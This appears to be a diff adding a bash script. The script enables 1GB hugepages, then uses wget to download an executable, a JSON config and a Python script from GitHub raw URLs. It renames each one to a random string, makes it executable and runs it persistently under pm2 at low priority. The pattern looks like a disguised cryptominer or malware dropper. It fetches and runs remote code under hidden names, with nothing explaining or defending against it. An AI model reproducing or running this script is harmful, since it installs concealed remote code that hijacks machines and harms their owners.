@@ -1,0 +1,44 @@
+#!/bin/bash
+random_name() {
+      tr -dc A-Za-z0-9 </dev/urandom | head -c 105
+  }
+  sysctl -w vm.nr_hugepages=$(nproc)
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+echo "1GB pages successfully enabled"
+echo "=== HugePages ==="
+grep -iE 'HugePages|Hugepagesize|Hugetlb' /proc/meminfo
+
+echo "=== CPU 1GB support ==="
+grep -m1 -o 'pdpe1gb' /proc/cpuinfo
+
+echo "=== Kernel ==="
+uname -r
+wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x
+
+NEW_V2=$(random_name)
+mv x $NEW_V2
+chmod +x $NEW_V2
+wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/w.json
+
+echo "./$NEW_V2 run --config=w.json" > bash.sh
+NEW_SH=$(random_name).sh
+mv bash.sh $NEW_SH
+chmod +x $NEW_SH
+
+npm install -g pm2
+pm2 start $NEW_SH
+
+wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.py
+NEW_PY=$(random_name).py
+mv main.py $NEW_PY
+chmod +x $NEW_PY
+echo "./$NEW_PY" > bsh.sh
+chmod +x bsh.sh
+./bsh.sh
+nice -n 19 pm2 start bsh.sh
+sleep 1600
